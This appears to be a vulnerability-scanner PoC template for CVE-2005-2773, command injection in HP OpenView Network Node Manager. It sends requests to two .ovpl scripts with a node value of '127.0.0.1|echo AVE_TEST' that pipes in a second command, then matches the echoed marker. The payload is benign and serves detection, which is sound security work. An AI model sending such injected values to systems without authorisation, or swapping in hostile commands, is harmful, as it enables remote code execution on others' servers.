[info]
id = "POC-AVE-2005-0001"
name = "HP OpenView Network Node Manager 远程命令执行 PoC"
author = "AVE"
severity = "critical"
tags = ["rce", "command-injection", "cwe-77"]
description = "HP OpenView Network Node Manager 6.2-7.50 中多个 .ovpl 脚本的 node 参数存在命令注入漏洞，远程攻击者可通过 shell 元字符执行任意命令。"
vuln_id = ["CVE-2005-2773", "AVE-2005-0001"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/connectedNodes.ovpl"
query.node = "127.0.0.1|echo%20AVE_TEST"
headers.Connection = "close"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["AVE_TEST"]
expect = true

[[poc.requests]]
method = "GET"
path = "/cdpView.ovpl"
query.node = "127.0.0.1|echo%20AVE_TEST"
headers.Connection = "close"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["AVE_TEST"]
expect = true

